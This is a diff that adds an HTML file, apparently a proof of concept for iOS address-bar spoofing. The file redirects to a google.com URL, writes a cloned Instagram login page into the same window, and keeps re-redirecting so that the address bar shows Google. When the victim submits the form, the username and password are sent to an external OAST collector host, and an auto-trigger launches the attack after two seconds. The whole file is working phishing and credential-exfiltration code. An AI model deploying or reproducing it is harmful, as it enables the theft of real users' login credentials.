@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<body style="margin:0; padding:0;">
+<button onclick="spoof()" style="position:fixed; top:20px; left:20px; z-index:9999; padding:10px; background:#ff4444; color:white; border:none;">Click to Spoof Instagram Login</button>
+
+<script>
+function spoof() {
+    // Step 1: Ultra-fast redirect to CSI (locks address bar to google.com)
+    top.location.replace("https://www.google.com/csi");
+    
+    // Step 2: IMMEDIATE content injection (before iOS reset)
+    setTimeout(() => {
+        window.stop(); // STOP any ongoing load
+        
+        // Attacker's INSTAGRAM LOGIN PAGE (exact clone)
+        const instagramPayload = `
+            <div style="background:#fafafa; min-height:100vh; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto; display:flex; align-items:center; justify-content:center; padding:20px;">
+                <div style="background:white; border:1px solid #dbdbdb; border-radius:4px; padding:40px 40px 20px; width:350px; text-align:center;">
+                    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" style="width:175px; margin:0 auto 20px;">
+                    <h2 style="font-size:14px; color:#262626; margin:0 0 20px; line-height:1.5;">Log in to see photos and videos from your friends.</h2>
+                    
+                    <form style="margin-bottom:20px;">
+                        <input type="text" id="username" placeholder="Phone number, username, or email" 
+                               style="width:100%; padding:9px 0 7px 8px; margin:0 0 6px; background:#fafafa; border:1px solid #efefef; border-radius:3px; font-size:14px; box-sizing:border-box;">
+                        <input type="password" id="password" placeholder="Password" 
+                               style="width:100%; padding:9px 0 7px 8px; margin:0 0 6px; background:#fafafa; border:1px solid #efefef; border-radius:3px; font-size:14px; box-sizing:border-box;">
+                        <button type="button" onclick="captureCreds()" 
+                                style="width:100%; padding:7px; background:#0095f6; color:white; border:none; border-radius:5px; font-weight:600; font-size:14px; cursor:pointer; margin:6px 0;">
+                            Log In
+                        </button>
+                    </form>
+                    
+                    <div style="font-size:13px; color:#8e8e8e; margin:10px 0;">
+                        <a href="#" style="color:#00376b; text-decoration:none;">Forgot password?</a>
+                    </div>
+                </div>
+            </div>
+        `;
+        
+        // CRITICAL: Write to CURRENT window, NO new window
+        document.open();
+        document.write(instagramPayload);
+        document.close();
+        
+        // Step 3: ULTRA-FAST interval (5ms) to prevent iOS reset
+        let resetCounter = 0;
+        const intervalId = setInterval(() => {
+            if (resetCounter > 100) clearInterval(intervalId); // Stop after 500ms
+            top.location.replace("https://www.google.com/csi");
+            resetCounter++;
+        }, 5);
+        
+    }, 10); // 10ms delay - FASTEST possible
+    
+    // Step 4: Capture function
+    window.captureCreds = function() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        if (username && password) {
+            // Send to YOUR OAST (GET for easy logging)
+            const oastUrl = `https://oxomzauseuatgjlyyqtdkiq3v0vsnm0p5.oast.fun/insta?user=${encodeURIComponent(username)}&pass=${encodeURIComponent(password)}&ua=${encodeURIComponent(navigator.userAgent)}`;
+            window.location.href = oastUrl; // Redirect to capture
+            
+            // OR POST (stealthier)
+            // fetch('https://your-oast.oast.fun/capture', {
+            //     method: 'POST',
+            //     body: JSON.stringify({username, password, userAgent: navigator.userAgent})
+            // });
+        }
+    };
+}
+
+// Auto-trigger after 2s (for full automation)
+setTimeout(spoof, 2000);
+</script>
+
+<!-- Debug overlay -->
+<div style="position:fixed; top:0; left:0; background:rgba(0,0,0,0.9); color:lime; padding:5px; font-size:10px; z-index:99999;">
+    Instagram iOS PoC Active | Content: <span id="contentStatus">Loading...</span>
+</div>
+</body>
+</html>
